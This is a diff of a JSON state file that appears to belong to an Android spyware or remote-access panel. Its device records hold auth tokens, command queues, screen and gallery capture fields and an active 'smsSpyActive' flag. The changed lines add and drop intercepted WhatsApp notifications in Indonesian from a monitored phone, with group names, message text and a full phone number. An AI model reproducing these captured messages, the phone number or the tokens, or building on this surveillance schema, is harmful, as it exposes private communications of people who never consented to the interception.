@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044917948,
+    "lastSeen": 1775044921064,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775044916526,
+    "lastSeen": 1775044919407,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15539 pesan dari 10 chat",
+        "time": "01/04 20:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044921066
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13292 pesan): ~ Fegg",
+        "content": "pesan minuman",
+        "time": "01/04 20:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044920952
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13291 pesan): ~ Bot",
@@ -8048,22 +8064,6 @@
         "time": "01/04 19:53",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044410960
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15396 pesan dari 10 chat",
-        "time": "01/04 19:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044410935
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎🇫🇮GB OPTEST XEMETRIX ELITE🇫🇮 (49 pesan): ~ ?",
-        "content": "📷 gg @⁨+62 813-1935-3554⁩",
-        "time": "01/04 19:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044409119
       }
     ],
     "galleryPhotos": [],
